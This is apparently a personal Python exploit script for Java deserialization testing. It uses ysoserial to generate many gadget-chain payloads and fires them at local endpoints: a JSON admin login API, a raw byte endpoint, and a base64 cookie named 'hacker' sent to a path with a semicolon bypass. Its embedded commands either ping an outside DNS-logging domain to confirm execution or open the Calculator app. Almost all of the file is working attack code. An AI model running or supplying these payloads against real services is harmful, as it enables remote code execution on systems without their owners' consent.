import requests
import subprocess
import time
import base64


def main():
    burp0_url = "http://127.0.0.1:8090/api/admin/login"
    burp0_cookies = {"JSESSIONID": "194AFB9FB798E4778345C968F7662F0B", "CSRFTOKEN": "1127913799", "SECURE": "SECURE_1896933955"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json;charset=utf-8", "Origin": "http://127.0.0.1:8090", "Connection": "close", "Referer": "http://127.0.0.1:8090/admin/index.html"}
    
    payloads = ["BeanShell1", "C3P0", "Clojure", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6", "FileUpload1", "Groovy1", "Hibernate1", "Hibernate2", "JBossInterceptors1", "JRMPClient", "JRMPListener", "JSON1", "JavassistWeld1", "Jdk7u21", "Jython1", "MozillaRhino1", "Myfaces1", "Myfaces2", "ROME", "Spring1", "Spring2", "URLDNS", "Wicket1"]
    for payload in payloads:
        try:
            p = subprocess.Popen('java -jar /Users/rym/all/program/tools/ysoserial/ysoserial-0.0.6-SNAPSHOT-all.jar ' + payload + ' \"ping -c 2 ' + payload + '1.dns.5wimming.com\"', shell=True, stdout=subprocess.PIPE)
            out, err = p.communicate()
            # base64.b64encode(out)
            requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=out)
            time.sleep(3)
        except Exception as e:
            print(payload, e)


def yso_input_stream():
    target = "http://127.0.0.1:8080/ser/byte"
    p = subprocess.Popen(
        'java -jar /Users/rym/all/program/tools/ysoserial/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 \"open /System/Applications/Calculator.app\"',
        shell=True, stdout=subprocess.PIPE)
    out, err = p.communicate()
    r = requests.post(target, data=out)
    print(r.text)


def print_yso():
    payloads = ["BeanShell1", "C3P0", "Clojure", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6", "FileUpload1", "Groovy1", "Hibernate1", "Hibernate2", "JBossInterceptors1", "JRMPClient", "JRMPListener", "JSON1", "JavassistWeld1", "Jdk7u21", "Jython1", "MozillaRhino1", "Myfaces1", "Myfaces2", "ROME", "Spring1", "Spring2", "URLDNS", "Wicket1"]
    for payload in payloads:
        try:
            p = subprocess.Popen('java -jar /Users/rym/all/program/tools/ysoserial/ysoserial-0.0.6-SNAPSHOT-all.jar ' + payload + ' \"open /System/Applications/Calculator.app\"', shell=True, stdout=subprocess.PIPE)
            out, err = p.communicate()
            result = str(base64.b64encode(out))[2:-1]
            print(payload, result)
            burp0_headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0",
                "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json;charset=utf-8",
                "Origin": "http://127.0.0.1:8090", "Connection": "close",
                "Cookie": "hacker=" + result,
                "Referer": "http://127.0.0.1:8090/admin/index.html"}
            requests.get('http://127.0.0.1:8000/index/%3b/xxx', headers=burp0_headers, timeout=20)

            time.sleep(5)
        except Exception as e:
            pass


if __name__ == '__main__':
    print_yso()